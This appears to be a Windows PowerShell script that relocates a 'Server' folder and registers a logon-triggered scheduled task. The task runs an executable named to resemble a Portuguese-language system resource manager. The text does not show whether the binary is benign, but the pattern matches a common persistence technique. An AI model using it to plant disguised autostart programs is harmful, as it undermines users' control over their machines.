$usrPath = $PWD.Path
$usr = Split-Path $usrPath -Leaf
$dest = Join-Path $usrPath "AppData\Local\Server"
Move-Item $env:LOCALAPPDATA\Server $dest -Force
$exec = Join-Path $dest "Gerenciador de recursos do sistema.exe"

$realDmn = (Get-WmiObject Win32_ComputerSystem).PartOfDomain
$dmn = if ($realDmn) {
    (Get-WmiObject Win32_ComputerSystem).Domain
} else {
    $env:COMPUTERNAME
}

$acc = "$dmn\$usr"
$tsk = "GerenciadorRecursos"

schtasks /delete /tn $tsk /f

schtasks.exe /create `
    /tn $tsk `
    /tr "'$exec'" `
    /sc onlogon `
    /ru "$acc" `
    /rl limited